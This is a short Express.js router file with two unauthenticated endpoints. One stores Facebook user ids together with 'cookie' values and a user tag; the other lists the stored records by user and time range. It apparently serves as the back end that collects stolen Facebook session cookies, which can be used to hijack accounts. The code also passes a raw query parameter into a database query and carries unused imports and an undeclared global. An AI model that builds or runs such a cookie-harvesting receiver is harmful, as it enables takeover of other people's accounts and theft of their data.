const express = require('express');
const path = require('path');
const { unzipSync } = require('zlib');
const FBUser = require("../database/FBUser");


router = express.Router();


router.get("/data", async (req,res) => {
    let searchQuery = {};
    const {from,to,user} = req.query;
   
    if (user){
        searchQuery.user = user;
    }
    if (from && to){
        searchQuery.created = {
             $gt: parseInt(from), $lt: parseInt(to)
        }
    }

    const users = await FBUser.find(searchQuery);
    res.send(users);
})

router.post("/data", async(req,res) => {
    const {uid,cookie,created,user} = req.body;
    try {
            
        const fbuser = await FBUser.create({
            uid: uid, cookie : cookie, user: user
        })
        res.send(fbuser)
    } 
    catch (err){
        res.send(err.message);
    }

})
module.exports = router;
